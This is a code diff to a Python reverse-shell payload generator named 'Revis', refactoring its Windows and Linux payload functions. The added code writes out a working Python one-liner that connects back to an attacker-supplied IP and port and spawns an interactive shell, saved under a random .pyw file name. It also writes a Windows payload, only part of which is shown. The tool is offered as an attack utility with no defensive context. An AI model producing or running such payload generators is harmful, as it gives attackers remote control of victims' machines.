@@ -10,15 +10,26 @@ def clear_screen():
     subprocess.run(["cls"], shell=True)
 
 
-def windows():
-    clear_screen()
-    print(colored("""
-    R e v i s > Windows Payload Generator
+def linux_payload(ip_addr, port):
+    linux_payload = f"""
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip_addr}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+    """
+    lower = string.ascii_lowercase
+    upper = string.ascii_uppercase
+
+    payloadName = upper + lower
+    length = 5
+
+    name = ""
+    for i in range(length):
+        letters = random.choice(payloadName)
+        name += letters
+    with open(f"{name}.pyw", "w") as payload:
+        payload.write(linux_payload)
+    print(colored(f"\nPayload: {name}.pyw generated in {os.getcwd()}", "light_red"))
 
 
-        """, "light_red"))
-    ip_addr = input(colored("Enter IP Addr: ", "light_red"))
-    port = int(input(colored("Enter PORT No: ", "light_red")))
+def windows_payload(ip_addr, port):
     windows_payload = f"""
 
 import os,socket,subprocess,threading;
@@ -63,7 +74,21 @@ except KeyboardInterrupt:
         name += letters
     with open(f"{name}.pyw", "w") as payload:
         payload.write(windows_payload)
-    print(f"Payload generated: {name}.pyw")
+    print(f"\nPayload generated: {name}.pyw in {os.getcwd()}")
+
+
+
+def windows():
+    clear_screen()
+    print(colored("""
+    R e v i s > Windows Payload Generator
+
+
+        """, "light_red"))
+    ip_addr = input(colored("Enter IP Addr: ", "light_red"))
+    port = int(input(colored("Enter PORT No: ", "light_red")))
+
+    windows_payload(ip_addr, port)
 
 
 def linux():
@@ -75,23 +100,8 @@ def linux():
         """, "light_red"))
     ip_addr = input(colored("Enter IP address: ", "light_red"))
     port = int(input(colored("Enter Port Number: ", "light_red")))
-    linux_payload = f"""
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip_addr}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
-    """
-    lower = string.ascii_lowercase
-    upper = string.ascii_uppercase
+    linux_payload(ip_addr, port)
 
-    payloadName = upper + lower
-    length = 5
-
-    name = ""
-    for i in range(length):
-        letters = random.choice(payloadName)
-        name += letters
-    with open(f"{name}.pyw", "w") as payload:
-        payload.write(linux_payload)
-    print(colored(f"\nPayload: {name}.pyw generated in {os.getcwd()}", "light_red"))
-    
 def payloadSelection():
     clear_screen()
     choices = input(colored("""1) Windows Payload
